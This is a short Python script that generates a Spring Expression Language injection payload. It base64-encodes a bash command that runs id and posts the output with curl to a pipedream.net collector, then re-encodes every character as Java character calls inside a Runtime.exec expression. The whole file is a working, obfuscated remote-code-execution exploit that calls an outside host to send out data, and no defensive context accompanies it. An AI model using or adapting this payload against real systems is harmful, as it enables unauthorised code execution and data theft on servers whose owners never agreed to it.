### PAYLOAD GENERATOR

# Generated using https://ares-x.com/tools/runtime-exec/
# Original payload: curl --data "a=$(id)" https://ebd7cbd9cea913d94aa198a2544ae8d0.m.pipedream.net
payload = "bash -c {echo,Y3VybCAtLWRhdGEgImE9JChpZCkiIGh0dHBzOi8vZWJkN2NiZDljZWE5MTNkOTRhYTE5OGEyNTQ0YWU4ZDAubS5waXBlZHJlYW0ubmV0}|{base64,-d}|{bash,-i}"
result = ""

result += 'T(java.lang.Character).toString(%s)' % ord(payload[0])
for ch in payload[1:]:
    result += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
result = '${T(java.lang.Runtime).getRuntime().exec(' + result + ')}'

print result